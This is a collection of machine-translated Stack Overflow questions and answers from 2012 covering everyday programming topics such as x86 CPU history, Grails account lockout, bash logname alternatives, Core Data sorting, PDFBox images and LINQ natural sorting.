> 
> 赞同：1
> 
> 时间：2012-06-15T13:57:59.247
> 
> 标签：x86, intel, cpu-registers, cpu-architecture, computer-architecture

阅读英特尔创建的CPU的不同血统，我的脑海中出现了许多需要解决的问题。问题如下：

就使 8085 和 8086 的架构不同而使英特尔对这两种架构的命名有所不同而言，是什么区别？

注意：我的朋友告诉我 8085 是 8 位微处理器，但 8086 是 16 位处理器，这就是它们彼此不同的原因，这就是为什么，一个叫 8085，另一个叫 8086。但据我所知，我们现在使用的大多数 CPU 目前都称为基于 8086 cpu 的 80x86 架构，它有 32 位版本和 64 位版本，老实说，这表明我朋友的解释是错误的因为所有这些 CPU 仍然被称为 80x86 架构，尽管位有所不同。

作为后续，80x86 架构从 8086 继承了哪些属性，为什么 Intel 不直接将 CPU 称为 8087 而是将其称为 80186 、 80286 、 80386 等？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-15T14:46:43.717

8085与 8086**非常**不同。它们有不同的寄存器，非常不同的指令集，它们可以寻址不同数量的内存，它们处理中断的方式不同等等。而且，是的，8085 是一个 8 位 CPU，而8086 是 16 位的。

80x86（或简称x86）通常指的是8086/8088、80186、80286、80386、80486、奔腾。如上所述，这种架构与 8085/8080 的架构非常不同（并且非常相似，但功能更强大的 Z80）。为什么要使用相同的名称命名完全不同的事物？

8087 不是 CPU，而是 FPU。它与 8086 完全不同。然而，它成为了 80486 CPU 的功能部分。在此之前，它是可选的 PC 部件。该系列中有多个 FPU，例如：8087、80287、80387。这就是众所周知的 x87。

今天的 x86 CPU 在功能上可以做所有与 8086 相同的事情，只是速度要快得多，而且它们不携带一些 8086 错误。英特尔/AMD 不想继续支持或已经选择不支持的东西很少（例如，未记录和重复的指令以及 64 位模式下的一些指令和指令编码，但 64 位模式不是您的正常 x86 和因此通常称为 x86/64 或 x64）。

如果你问为什么 CPU 编号看起来不是很连续（例如，更好的 8086 应该是 8087，然后是 8088 和 8089），我不知道。但这有多重要，真的吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-11-03T03:27:33.723

实际上，8085 架构实际上是一个 8 位微处理器并遵循 8 位架构，而 8086 实际上是一个 16 位微处理器，它的架构被称为 x86 架构，它们之间的相似之处主要在于它们的助记符或 ASM 代码。现在一般 32 位系统甚至共享相同的 x86 架构

# grails - 使用 Grails + Spring Security 登录尝试失败后自动锁定帐户

> ID：11052067
> 
> 赞同：-1
> 
> 时间：2012-06-15T13:58:04.937
> 
> 标签：grails, spring-security

Grails 的 Spring Security 插件是否支持在 X 次登录尝试失败后自动锁定帐户？“帐户锁定”的文档部分仅提到有一个`accountLocked`属性。

如果不是开箱即用，那么实施它的最佳方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:33:23.187

不，它不会为您处理。您需要跟踪登录尝试，然后自行锁定。文档[在这里](http://grails-plugins.github.com/grails-spring-security-core/docs/manual/guide/12%20Password%20and%20Account%20Protection.html#12.3%20Account%20Locking%20and%20Forcing%20Password%20Change)说了很多。

> 您可以使用此功能手动锁定用户帐户或使密码过期，但您可以自动执行该过程。例如，使用 Quartz 插件定期使每个人的密码过期，并强制他们转到他们更新密码的页面。跟踪用户更改密码的日期，并在密码超过固定的最大使用期限后使用 Quartz 作业使密码过期。

我会使用插件的事件功能并实现我自己的 AuthenticationFailureEvent。跟踪用户的登录尝试，并在第三次尝试时翻转锁定位。您可能还想实现自己的 AuthenticationSuccessEvent 以便在他们在第 3 次尝试之前获得该位时可以重置该位。

# database - 在连接到 Oracle 数据库时出错退出 cmd

> ID：11052069
> 
> 赞同：0
> 
> 时间：2012-06-15T13:58:12.987
> 
> 标签：database, batch-file, cmd

以下代码用于通过批处理文件连接到 Oracle 数据库，提示输入用户名、密码和数据库实例。如果任何凭据无效，我想要的是退出 cmd 本身，否则它应该正常进行。

```
@ECHO OFF
:START
set /p U="Enter Username(User ID):"
set /p P="Enter Password(Password@o1234abc):
:NEXT
set /p a="Do you want to display details of 1a?(y/n)"
ECHO "%a%"
if "%a%" == "y" sqlplus %U%/%P% @".\AB_1a.sql" 
if "%a%" == "n" goto A 
set /p id1= "Please enter ID for 1a(press 's' to SKIP):"
if "%id1%" == "s" goto A 
sqlplus %U%/%P% @".\AB_.sql" %id1%
goto A
:End 
```

请提出任何解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T15:00:16.003

你可以这样做：

```
@echo off
setlocal enableDelayedExpansion
set /p U="Enter Username(User ID):" 
set /p P="Enter Password(Password@o1234abc):
rem Check creds!
if "!U!" == "JoeBloggs" if "!P!" == "Pa$$w0rd" goto :CREDSOK
exit >nul

:CREDSOK
set /p a="Do you want to display details of 1a?(y/n)" 
if "%a%" == "y" sqlplus %U%/%P% @".\AB_1a.sql"  
if "%a%" == "n" goto A  
set /p id1= "Please enter ID for 1a(press 's' to SKIP):" 
if "%id1%" == "s" goto A  
sqlplus %U%/%P% @".\AB_.sql" %id1% 
goto A 
:End 
```

如果凭据正确，它将跳过该行退出并运行其余部分，如果任何一个凭据错误，它将到达退出行并终止 cmd。

感谢@jeb 建议延迟扩展特殊字符，请参阅下面的评论。

希望这可以帮助。

# bash - 在 bash 脚本中获取 SSH 登录名

> ID：11052070
> 
> 赞同：4
> 
> 时间：2012-06-15T13:58:15.830
> 
> 标签：bash, ssh

我在服务器**A**上有一个 Bash 脚本，它通过命令找到登录的 SSH 用户`logname`，即使它`root`以`sudo`. 如果我从我的桌面 SSH 到服务器**A**并运行脚本，它工作正常。

但是，我在 SVN 服务器**S**上设置了一个提交后挂钩，它通过 SSH 连接到**A**并在那里运行脚本，这导致 logname 失败，并出现错误“logname: no login name”。

如果我从桌面SSH 到**S ，然后从那里 SSH 到****A**，它可以正常工作，所以错误一定是 SVN 挂钩最终没有从虚拟终端运行。

我可以在这里使用什么替代品`logname`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:03:38.403

您可以使用以下`id`命令：

```
 $ ssh 192.168.0.227 logname
  logname: no login name 
```

然而

```
 $ ssh 192.168.0.227 id
  uid=502(username) gid=100(users) groups=100(users) 
```

在 bash 脚本中，您可以使用类似的东西从 id 输出中删除用户名

```
 $ id | cut -d "(" -f 2 | cut -d ")" -f1
  username 
```

要拥有一个在 sudo 环境和没有终端的情况下都可以工作的脚本，您总是可以有条件地执行不同的命令。

```
if logname &> /dev/null ; then 
    NAME=$( logname )
else 
    NAME=$( id | cut -d "(" -f 2 | cut -d ")" -f1 )
fi
echo $NAME 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-15T14:43:44.437

这就是我最终的结果。

```
if logname &> /dev/null; then
    human_user=$(logname)
else
    if [ -n "$SUDO_USER" ]; then
        human_user=$SUDO_USER
    else
        human_user=$(whoami)
    fi
fi 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-15T15:02:53.490

使用`id -nu`. 没有愚蠢的分叉和切割来获取用户名。

# java - 我如何在 java gui 中使用图像

> ID：11052071
> 
> 赞同：1
> 
> 时间：2012-06-15T13:58:16.760
> 
> 标签：java, image, user-interface, jpanel, paintcomponent

嗨，我正在制作一个使用空布局和 setBounds() 方法进行布局的 Gui 程序。在程序中，我希望在屏幕上随机位置打印出 25 个字符串。我知道我可以使用 for 循环来做到这一点，但是我一直在尝试这样做无济于事。

```
public void paint(Graphics g){
    super.paint(g);
    for(i=0;i<25;i++){
        g.drawString("string name",Math.random()*250,Math.random()*250);
        g.setColor(Color.RED);
    }
} 
```

我一直在尝试这个并且它没有工作所以我的问题是有没有更好的方法来做到这一点，或者我是否犯了某种明显的错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:11:32.687

您没有正确使用 Math.random() 部分，请尝试以下操作：

```
import java.awt.Color;
import java.awt.Container;
import java.awt.EventQueue;
import java.awt.Graphics;
import java.util.Random;
import javax.swing.JFrame;
import javax.swing.JPanel;

/**
 *
 * @author David
 */
public class JavaApplication142 extends JFrame {

    private int width = 300, height = 300;

    public JavaApplication142() {
        createAndShowUI();
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        EventQueue.invokeLater(new Runnable() {

            @Override
            public void run() {
                JavaApplication142 jApp = new JavaApplication142();
            }
        });
    }

    private void createAndShowUI() {
        setTitle("Painting");
        setSize(width, height);
        setResizable(false);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);
        addComponentsToContentPane(getContentPane());
        setVisible(true);
    }

    private void addComponentsToContentPane(Container contentPane) {
        Panel panel1 = new Panel();
        contentPane.add(panel1);
    }

    class Panel extends JPanel {

        private Random rand;

        public Panel() {
            rand = new Random();
        }

        @Override
        public void paintComponent(Graphics g) {
            super.paintComponent(g);
            for (int i = 0; i < 25; i++) {
                g.drawString("string name", (int) rand.nextInt(width), (int) rand.nextInt(height));
                g.setColor(Color.RED);
            }
        }
    }
} 
```

这将有助于在面板区域内绘制所有字符串，尽管长度不同的字符串可能会离开屏幕，只需添加一些额外的代码来检查字符串的长度并适当地设置其坐标

# iphone - 如何在 Core Data 中对 fetch 进行排序

> ID：11052074
> 
> 赞同：2
> 
> 时间：2012-06-15T13:58:28.297
> 
> 标签：iphone, ios, xcode, core-data

我正在获取数据以在 UITableView 中显示它，我进行了获取，但我想按创建日期或任何排序方法对它们进行排序。

这是方法：

```
-(NSArray *) lesStations {

NSManagedObjectContext *moc = [[AppDelegate sharedAppDelegate]managedObjectContext];

NSFetchRequest *fetch = [[NSFetchRequest alloc] init];
NSEntityDescription *entity =  [NSEntityDescription entityForName:@"Station" inManagedObjectContext:moc];

[fetch setEntity:entity];
NSError *error;

NSArray *result = [moc executeFetchRequest:fetch error:&error];

if (!result) {
    return nil;
}

return result;

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:17:18.147

这应该工作

```
-(NSArray *) lesStations {

    NSManagedObjectContext *moc = [[AppDelegate sharedAppDelegate]managedObjectContext];

    NSFetchRequest *fetch = [[NSFetchRequest alloc] init];
    NSEntityDescription *entity =  [NSEntityDescription entityForName:@"Station" inManagedObjectContext:moc];

    [fetch setEntity:entity];
    NSError *error;

    NSArray *result = [moc executeFetchRequest:fetch error:&error];

    if (!result) {
        return nil;
    }

    NSSortDescriptor *sort = [[NSSortDescriptor alloc] initWithKey:"creationDate" ascending:YES];

    NSArray *sortedResults = [result sortedArrayUsingDescriptors:[NSArray arrayWithObject:sort]];

    [sort release];

    return sortedResults;

} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-15T14:08:33.453

您有 2 个选项：对结果进行排序或对结果进行排序`NSArray`：
`NSFetchRequest`可以设置`NSArray`为`NSSortDescriptor`

```
NSSortDescriptor *sort = [[NSSortDescriptor alloc] initWithKey:@"place" ascending:NO]; //the key is the attribute you want to sort by
[fetchRequest setSortDescriptors:[NSArray arrayWithObject:sort]]; 
```

您还可以对返回的结果进行排序（查看以开头的`NSArray`所有实例方法） 我建议在使用 CoreData 时使用第一种方法。第二个只是在使用数组时提供信息......`NSArray``sortedArray...`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:05:48.140

您可以通过为 fetch 设置 sortDescriptors 来对 fetch 结果进行排序，例如

```
fetch.sortDescriptors = [NSArray arrayWithObjects:[[NSSortDescriptor alloc] initWithKey: ascending: selector:], nil];
NSError *error;
NSArray *result = [moc executeFetchRequest:fetch error:&error]; 
```

# iphone - 将来自 Web 服务的字节数组转换为 UIImage iPhone

> ID：11052076
> 
> 赞同：-2
> 
> 时间：2012-06-15T13:58:36.943
> 
> 标签：iphone, objective-c, web-services

我是这项技术的新手。我搜索了很多，但找不到任何相关的。在我的应用程序中，我从 Web 服务接收字节数组，我从 Web 服务接收的字节数组是

> [137,80,78,71,13,10,26,10,0,0,0,13,73,72,68,82,0,0,1,195,0,0,1,195,8,2,0 ,0,0,215,2...]

我想将此**字节数组**转换为**UIImage以在****UIImageView**中显示它。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T14:00:39.893

使用下面的 UIImage 构造函数。

```
+ (UIImage *)imageWithData:(NSData *)data;

NSData *data = [NSData dataWithBytes:YOUR_BYTE_ARRAY length:ARRAY_LENGTH];

UIImage *img = [UIImage imageWithData:data];

UIImageView *imgView = [[UIImageView alloc]initWithImage:img]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-19T06:41:56.483

```
#import "NSDataAdditions.h"

NSData *dataObj = [NSData dataWithBase64EncodedString:StringImage];
UIImage *Image = [UIImage imageWithData:dataObj]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-20T20:19:26.843

上面字节数组中的前 8 个字节`\211 P N G \r \n \032 \n`（或`137,80,78,71,13,10,26,10`十进制）表明这是一个[`PNG`](http://en.wikipedia.org/wiki/Portable_Network_Graphics#File_header)文件。

至少，您应该能够将整个字节序列保存到文件中，然后使用`+ (UIImage *)imageNamed:(NSString *)name`or加载它`+ (UIImage *)imageWithContentsOfFile:(NSString *)path`。例如：

```
 UIImage *myImage = [UIImage imageNamed:@"myfile.png"]
                                      // myfile.png should be in the main bundle 
```

（由于这个原因，Apurv 的方法更直接，也更好。但由于你对它有这么大的困难，我想我会建议一种稍微不同的方法。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-19T05:32:22.743

您需要先对数据进行 Base64 解码。从许多 SOAP Web 服务返回的数据是 base 64 编码的，有时还有嵌入网站的原始数据。这很简单，但最容易使用别人创建的库。

首先将其包含在您的项目中，并将 .h 包含在此文件中：[https ://github.com/nicklockwood/Base64](https://github.com/nicklockwood/Base64)

```
NSString *base64String = @"**YOUR BYE ARRAY HERE**";
UIImage *imageOrig = [UIImage imageWithData:[NSData dataFromBase64String:base64String]];
UIImageView *imageView = [[UIImageView alloc]initWithImage:imageOrig]; 
```

那应该这样做。在我以前的经验中，我只是将我通过 web 服务获得的任何数据 blob 放入一个字符串中，然后使用这种方法创建图像，它工作得很好，这里有一个关于 Base64 编码和解码细节的精彩讨论：[http://cocoadev .com/wiki/BaseSixtyFour](http://cocoadev.com/wiki/BaseSixtyFour)这是我用来创建我的课程的，但 Nick 在 gitHub 上的代码更好，因为它符合 ARC。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-08-02T07:11:22.277

从 Webservice 我们得到`NSNumber`. 我们将不得不将其转换为`NSData`：

```
NSMutableData *data = [[NSMutableData alloc] initWithCapacity: [strings count]];
for( NSNumber *number in strings) {
    char byte = [number charValue];
    [data appendBytes: &byte length: 1];
} 
```

隐蔽`NSData`到`UIImage`：

```
UIImage *imageOrig = [UIImage imageWithData:data]; 
```

我们也从`NSData`.

```
NSError *error1 = nil;
NSArray *jsonArray = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error1];

if (error1 != nil) {
    NSLog(@"Error parsing JSON.");
} else {
    NSLog(@"Array: %@", jsonArray);
} 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-06-15T14:27:30.570

```
 //Use this

CGColorSpaceRef colorSpace=CGColorSpaceCreateDeviceRGB();
CGContextRef bitmapContext=CGBitmapContextCreate(YOUR_BYTE_ARRAY, w, h, 8, 4*w, colorSpace,  kCGImageAlphaPremultipliedLast | kCGBitmapByteOrderDefault);
CFRelease(colorSpace);
free(YOUR_BYTE_ARRAY);
CGImageRef cgImage=CGBitmapContextCreateImage(bitmapContext);
CGContextRelease(bitmapContext);

UIImage *newimage = [UIImage imageWithCGImage:cgImage];
[yourImageView setImage:newimage];
CGImageRelease(cgImage); 
```

也许它会帮助你...

# sql-server - 可能导致高 CPU 使用率的 SQL Server 因素

> ID：11052078
> 
> 赞同：2
> 
> 时间：2012-06-15T13:58:49.130
> 
> 标签：sql-server, sql-server-2008, sql-server-2005

我正在尝试找出或收集导致与 SQL Server 相关的持续高 CPU 利用率的因素

这是我想出的几个

a) 存储过程或查询的编译或频繁重新编译

b) 执行大量排序或最终使用哈希联接的性能不佳的查询

c) 并行性（多个线程是跨度的，因此可以保持 CPU 忙碌）

d) T-SQL 中的循环构造，例如 WHILE 循环或使用 CURSOR

e) 导致表扫描的缺失或不适当的索引

还有哪些其他 SQL Server 操作会导致 CPU 使用率过高？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:02:53.937

**数据压缩**是相对 CPU 密集型的。 **加密**是另一种可能导致高 CPU 利用率的操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:05:06.197

使用标量用户定义函数使用的 CPU 比您想象的要多得多。

# jquery - 我正在尝试在 URL 中搜索字符串

> ID：11052079
> 
> 赞同：-1
> 
> 时间：2012-06-15T13:58:51.177
> 
> 标签：jquery, url, window.location

我希望使用 jquery 来搜索在用户提交表单后被标记到页面 url 末尾的某个字符串。

网址看起来像

```
https://somerandomsite.com/?page_id=1423#wpcf7-f1448-p1423-o1 
```

字符串中唯一保持一致的部分是“wpcf7”，所以我希望使用 jquery 来定位它，如果它发现它运行一些代码。也许以某种方式使用 window.location.pathname 。

任何帮助将非常感激。

============================================

我明白了，谢谢大家的帮助。我认为我在解释问题时不是很清楚，所以我道歉。

```
if(document.location.hash.substr(1,5) === 'wpcf7'){
$('#formalert').css('display', 'block'); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:02:19.903

该部分称为哈希，引用为：

```
location.hash 
```

这包括`#`角色本身，因此您必须跳过：

```
location.hash.substr(1) 
```

要获得它背后的第一部分：

```
location.hash.substr(1).split('-')[0] 
```

**更新**

最后的条件是这样的：

```
if (document.location.hash.substr(1).split('-')[0] === 'wpcf7') {
    // do whatever
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:03:42.933

您可以使用[搜索](http://www.w3schools.com/jsref/jsref_search.asp)：

```
str.search('wpcf7') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:05:49.180

您可以使用：

```
var urlPart = location.hash.substr(1);    // Retrieve part after dash #
var pages = urlPart.split('-'); // Split this part on "-"

var myInterstingPart = page[0]; // Get the first. 
```

不？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T15:31:36.910

也许是这样的：

```
if (window.location.hash.indexOf("wpcf7") != -1) {
   alert('window contains wpcf7');
} 
```

# php - 通过 ajax 和 jquery 实现多个 zend 分页控件

> ID：11052082
> 
> 赞同：0
> 
> 时间：2012-06-15T13:58:58.223
> 
> 标签：php, jquery, zend-framework, pagination, doctrine-orm

有人可以帮助我在使用 ajax 的视图中实现多个 zend 分页。我已经成功实现了单分页没问题，但现在我想执行超过 1 个。

这是我的设置：-

添加到引导程序：-

```
public function _initPaginator(){
    Zend_Paginator::setDefaultScrollingStyle('Sliding');
    Zend_View_Helper_PaginationControl::setDefaultViewPartial('pagination_control.phtml');   
} 
```

'pagination_control.phtml' 取自 zend 框架手册。

添加到控制器：-

```
public function init()
{
    parent::init();

    $ajaxContext = $this->_helper->getHelper('AjaxContext');
    $ajaxContext->addActionContext('view', 'html')
                ->initContext();
} 
```

将此添加到控制器操作中：-

```
public function viewAction()
{

    $query = $this->_em->createQueryBuilder()
       ->select('t')
       ->from('Ajfit\Entity\Ticket', 't')
       ->where('t.engineerFk = :engineer')
       ->orderBy('t.dt', 'desc')
       ->setParameter('engineer', $engineer)
       ->getQuery();

    $paginator =  new Paginator($query);
    $adapter->getIterator();

    $zend_paginator = new \Zend_Paginator($adapter);
    $zend_paginator->setItemCountPerPage(3)
                   ->setCurrentPageNumber($this->_getParam('page'));

    $this->view->ticketPaginator = $zend_paginator;
} 
```

将此添加到视图中：-

```
<div>
    <div id="ticket-history">
       <?php 
             echo $this->render('profile/view.ajax.phtml'); 
         ?>
       </div> 
</div>

<script>
    $(document).ready(function() {
        $('.pagination-control').find('a').live('click', function(e) { 
            var link = $(this); 
            $('#ticket-history').load(link.attr('href'), { format: 'html' }); 
            return false;
        });
    });
</script> 
```

我的 'profile/view.ajax.phtml' 脚本包含：-

```
<?php

     echo '<table border="0" width="100%" cellspacing="3" cellpadding="3"><tr>';

     foreach($this->ticketPaginator as $ticket){
         echo '<td>' . $ticket->getSubject() . '</td>';
     }

     echo '</tr></table>';
 ?>

<?php 
    echo $this->paginationControl($this->ticketPaginator);
?> 
```

这一切都很好，但是，如何为不同的学说实体在此视图中添加第二个或第三个分页器？

任何帮助将不胜感激。

谢谢

安德鲁

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:11:47.867

`addActionContext`为此，您必须使用多个`init()`

```
 $this->_helper->ajaxContext->addActionContext('view', 'html')->initContext();
    $this->_helper->ajaxContext->addActionContext('list', 'html')->initContext(); 
```

你可以继续

在控制器中添加操作与`listAction()`分页器一样创建文件`list.ajax.phtml`并在其中添加所需的代码

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T15:36:32.893

如果您操纵分页链接以使其调用其他操作，则可以解决此问题。

例如：在 View Part 中，您可以使用`paginationControl`方法的第四个参数来定义指向另一个动作的链接。然后应该调用这个链接`pagination_control.phtml`。

# javascript - 在 MetroApps 中创建另一个 ItemTemplate？

> ID：11052086
> 
> 赞同：1
> 
> 时间：2012-06-15T13:59:08.040
> 
> 标签：javascript, html, microsoft-metro, visual-studio-2012, winjs

![在此处输入图像描述](../Images/015ff39d598c75433d8cfb78b24b024a.png)我可以在 MetroApp 中创建另一个 ItemTemplate 吗？我在这里使用 visual-studio2012RC 和 Windows8 来开发 Metro 应用程序。我正在使用以下代码。它工作正常，就像我想创建另一个 ItemTemplate 以向我的应用程序添加一些数据一样,有没有其他模板可以代替这个或者我们可以在我们的 Html 中使用它吗？任何人都可以建议我。

工作示例对我真的很有帮助。

提前谢谢你。

```
<div class="itemtemplate" data-win-control="WinJS.Binding.Template">
    <img class="item-image" src="#" data-win-bind="src: backgroundImage; alt: title"/>
    <div class="item-overlay">
        <h4 class="item-title" data-win-bind="textContent: title"></h4>
        <h6 class="item-subtitle win-type-ellipsis" data-win-bind="textContent: subtitle"></h6>
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T07:04:22.570

您不能分配两个项目模板，但您可以分配 JS 函数，该函数根据您要绑定的内容动态生成项目模板。查看 MSDN：

[http://msdn.microsoft.com/en-us/library/windows/apps/hh700705.aspx#using_a_function_to_display_items](http://msdn.microsoft.com/en-us/library/windows/apps/hh700705.aspx#using_a_function_to_display_items)

在您的情况下，只需检查图像 url 是否为空并且不呈现“item-image”元素。

希望有帮助！

# image - PDFBox 添加图片时内存不足

> ID：11052091
> 
> 赞同：2
> 
> 时间：2012-06-15T13:59:20.370
> 
> 标签：image, memory, pdfbox

我正在使用 PDFBox 从我的 web 应用程序中提取数据并将其放入 PDF 中。我有一种方法可以在每个 PDF 页面上绘制标题。但是，当我向每一页添加图像时，文档内存不足。我想知道是否有人对解决方案有任何想法？这是我的 drawHeader 方法：

公共静态无效drawHeader（PDDocument doc，PDPage页面，PDPageContentStream contentStream，int [] columnWidths，int pageNumber）抛出IOException {

```
 contentStream.beginText();
    PDFont font = PDType1Font.HELVETICA_BOLD;
    contentStream.setFont(font, 24);
    contentStream.moveTextPositionByAmount(50, 750);
    contentStream.drawString("Producer License Report");
    contentStream.endText();

    contentStream.beginText();
    contentStream.moveTextPositionByAmount(550, 750); 

    contentStream.setFont(PDType1Font.HELVETICA_BOLD, 8);
    contentStream.drawString("Page " + pageNumber);
    contentStream.endText();

    contentStream.drawLine(50, 740, 340, 740);
    contentStream.drawLine(16, 680, 595, 680);

    List<String> headerList = new LinkedList<String>();
    headerList.add("NPN");
    headerList.add("First Name");
    headerList.add("Last Name");
    headerList.add("Suffix");
    headerList.add("License State");
    headerList.add("Resident State");
    headerList.add("License Number");

    contentStream.setFont(PDType1Font.HELVETICA_BOLD, 9);
    float textx = 15;
    float texty = 685;

    InputStream in = new FileInputStream(new File("logo.jpg"));
    PDJpeg img = new PDJpeg(doc, in);
    contentStream.drawImage(img, 375, 720);

    for (int i = 0; i < headerList.size(); i++) {
        String text = headerList.get(i);
        contentStream.beginText();
        contentStream.moveTextPositionByAmount(textx, texty);
        contentStream.drawString(text);
        contentStream.endText();
        textx += (columnWidths[i] * 6.5);
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-24T12:10:49.080

我找到了解决办法！您必须在打开 contentStream 之前创建 Image-Object。

例子：

```
 /* Step 1: Prepare the document.
               */
             doc = new PDDocument();
             PDPage page = new PDPage();
             doc.addPage(page);

             /* Step 2: Prepare the image
              * PDJpeg is the class you use when dealing with jpg images.
              * You will need to mention the jpg file and the document to which it is to be added
              * Note that if you complete these steps after the creating the content stream the PDF
              * file created will show "Out of memory" error.
              */

             PDXObjectImage image = null;
             image = new PDJpeg(doc, new FileInputStream("image.jpg"));
             PDPageContentStream contentStream = new PDPageContentStream(doc,
                    page);
.... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-13T16:00:11.723

我正在尝试评论 Timo Hoen 的答案，但还没有足够的代表...

我发现“内存不足”错误的另一个问题是图像是否很大，或者您试图将其从页面上绘制出来。

从您的坐标开始，`100, 100`然后从那里开始工作。

例如`contentStream.drawImage(img, 100, 100);`

干杯，

山姆

# iphone - UIWebView 错误委托方法与可达性

> ID：11052093
> 
> 赞同：0
> 
> 时间：2012-06-15T13:59:25.873
> 
> 标签：iphone, objective-c, ios, uiwebview, reachability

我正在将我的应用程序提交到 App Store，但我读到如果我的应用程序需要它时互联网连接中断，我必须通知用户。苹果页面也提到了可达性。不过，目前我正在使用 UIWebView 委托方法 didFailLoadWithError ...

```
- (void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error
{

    UIAlertView *errorAlert = [[UIAlertView alloc] initWithTitle:@"Error Loading" message:[error localizedDescription] delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil, nil];
    [errorAlert show];

} 
```

......它工作正常。我的问题是，我的应用程序是否会因为不使用 Reachability 来执行此操作而被拒绝，或者我目前正在做的事情是否可以？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:02:59.100

不，您完全可以使用`didFailLoadWithError:`.

`Reachability`类可用于在尝试加载某些页面之前检查主机是否已启动（或是否有 Internet 连接）。但这不是必需的，只要您处理可能的错误 - 显然您会这样做。

编辑：

了解您是否能够联系到某个主机仍然是一个好习惯。您甚至可以针对每种情况修改 GUI（而不仅仅是报告错误）。但这总是可以在更新中完成:)

# c# - 如何使用 LINQ 对后跟数字的文本字符串进行排序

> ID：11052095
> 
> 赞同：9
> 
> 时间：2012-06-15T13:59:27.280
> 
> 标签：c#, linq

我一直在使用以下排序：

```
var query = _cityRepository.GetAll(
               .OrderBy(item => item.RowKey.Substring(0, 4))
               .ThenBy(item => item.ShortTitle) 
```

但是我遇到了问题，因为我的 ShortTitle 看起来像这样：

```
Liverpool - 1
Liverpool - 2
...
Liverpool - 9
Liverpool - 10
Liverpool - 11
West Kirby - 1
West Kirby - 8
West Kirby - 12 
```

当我使用 LINQ 对其进行排序时，它按顺序排列

```
Liverpool - 1
Liverpool - 11
Liverpool - 12
Liverpool - 2
West Kirby - 1
West Kirby - 12
West Kirby - 8 
```

ShortTitle 始终是一串单词，后跟一个连字符，然后是一个数字。

有没有办法让它正确排序？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-06-15T14:03:56.493

试试这个

```
List<string> list = new List<string>() { 
    "Liverpool - 1",
    "Liverpool - 11",
    "Liverpool - 12",
    "Liverpool - 2",
    "West Kirby - 1",
    "West Kirby - 12",
    "West Kirby - 8" };
var sortedList = list.CustomSort().ToArray();    

public static class MyExtensions
{
    public static IEnumerable<string> CustomSort(this IEnumerable<string> list)
    {
        int maxLen = list.Select(s => s.Length).Max();

        return list.Select(s => new
        {
            OrgStr = s,
            SortStr = Regex.Replace(s, @"(\d+)|(\D+)", m => m.Value.PadLeft(maxLen, char.IsDigit(m.Value[0]) ? ' ' : '\xffff'))
        })
        .OrderBy(x => x.SortStr)
        .Select(x => x.OrgStr);
    }

} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-06-15T14:03:12.273

这是因为您将它们排序为字符串，并且对于字符串 11 排在 2 之前。您需要解析 以在最后`ShortTitle`为您提供（我假设的）`int`值，然后按此排序。

您的 LINQ 查询可以更改为它以使其工作：

```
var query = _cityRepository.GetAll(
           .OrderBy(item => item.RowKey.Substring(0, 4))
           .ThenBy(item => item.ShortTitle.Split('-').First())
           .ThenBy(item => Convert.ToInt16(item.ShortTitle.Split().Last())); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-15T14:17:54.887

又快又脏：

```
class Program
{
    static void Main(string[] args)
    {
        var list = new[] {"Liverpool - 1", 
                          "Liverpool - 11",
                          "Liverpool - 123",
                          "Liverpool - 342",
                          "Liverpool - 2"};

        foreach (var x in list.OrderBy(s => Int32.Parse(Regex.Match(s, @"- (\d*)").Groups[1].Value)))
            Console.WriteLine(x);
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-23T18:21:07.203

派对迟到了，但我不会让它阻止我！

捎带@NominSim 的好解决方案：

```
var query = _cityRepository.GetAll()
           .Select(item => 
             {
               var fields = item.ShortTitle.Split('-');
               return new
               {
                 Key = item.RowKey.Substring(0,4),
                 Title = fields[0].Trim(),
                 Index = Convert.ToInt16(fields[1])
               }
             })
           .OrderBy(item => item.Key)
           .ThenBy(item => item.Title)
           .ThenBy(item => item.Index); 
```

实际上，主要区别在于捕获拆分的结果，这样我们就不必再次进行拆分来获取索引，然后我在 Title 中添加了一个 Trim()。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-15T14:06:14.483

